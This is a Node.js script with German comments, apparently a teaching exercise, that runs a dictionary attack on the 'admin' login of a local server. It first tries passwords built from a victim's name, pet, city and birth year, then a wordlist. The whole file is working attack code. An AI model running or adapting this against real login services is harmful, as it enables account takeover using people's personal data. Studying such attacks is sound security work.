// Wörterbuch-Angriff: testet nur die Wörter aus einer Liste, nicht alle Kombinationen.
// Das ist meistens schneller, weil Leute oft bekannte/schwache Passwörter nehmen.
// Zusätzlich werden PERMUTATIONEN aus persönlichen Daten des Opfers gebildet
// (Name, Geburtsjahr, Haustier, ...), weil viele Leute genau solche Passwörter nehmen.

const fs = require("fs"); // eingebautes Modul zum Einlesen von Dateien

const username = "admin";

// Baut aus den persönlichen Daten in data/victim_profile.json Passwort-Kandidaten.
// Beispiel: "monkey", "Monkey", "monkey1998", "monkey98", "Max1998", ...
function buildPermutations() {
  const profile = JSON.parse(fs.readFileSync("data/victim_profile.json", "utf8"));
  const year = String(profile.birthYear);        // "1998"
  const shortYear = year.slice(-2);               // "98"
  const bases = [profile.name, profile.pet, profile.city].filter(Boolean);

  const candidates = [];
  for (const base of bases) {
    const firstWord = base.split(" ")[0];         // "Max Muster" -> "Max"
    const variants = [firstWord.toLowerCase(), firstWord];
    for (const v of variants) {
      candidates.push(v);                         // monkey
      candidates.push(v + year);                  // monkey1998
      candidates.push(v + shortYear);             // monkey98
    }
  }
  return candidates;
}

// einen Login-Versuch schicken, true wenn das Passwort stimmt
// async/await, weil wir auf die Antwort vom Server warten müssen
async function tryLogin(username, password) {
  const response = await fetch("http://localhost:3000/login", {
    method: "POST", // Daten an den Server senden
    headers: { "Content-Type": "application/json" }, // Daten sind JSON
    body: JSON.stringify({ username, password }), // Objekt in JSON-Text umwandeln
  });
  return response.status === 200; // 200 = Login OK
}

async function dictionaryAttack() {
  const start = Date.now(); // Startzeit für die Dauer merken

  // ganze Datei als Text einlesen und in einzelne Wörter (eine pro Zeile) aufteilen
  const content = fs.readFileSync("data/dictionary.txt", "utf8");
  const words = content
    .split(/\r?\n/)                     // bei jedem Zeilenumbruch trennen (Windows \r\n und Linux \n)
    .map((word) => word.trim())         // Leerzeichen/Reste am Rand entfernen
    .filter((word) => word.length > 0); // leere Zeilen rauswerfen

  // Erst die persönlichen Permutationen probieren (die sind oft am wahrscheinlichsten),
  // danach die allgemeine Wortliste.
  const candidates = [...buildPermutations(), ...words];

  console.log("Probiere", candidates.length, "Kandidaten (Permutationen + Wortliste) ...");

  // jeden Kandidaten der Reihe nach als Passwort ausprobieren
  for (const word of candidates) {
    const found = await tryLogin(username, word);
    if (found) {
      const seconds = (Date.now() - start) / 1000;
      console.log("Passwort gefunden:", word);
      console.log("Dauer:", seconds, "Sekunden");
      return; // gefunden -> wir können aufhören
    }
  }

  // Schleife ganz durch, kein Wort hat gepasst
  console.log("Kein Passwort im Wörterbuch gefunden.");
}

dictionaryAttack(); // Angriff starten
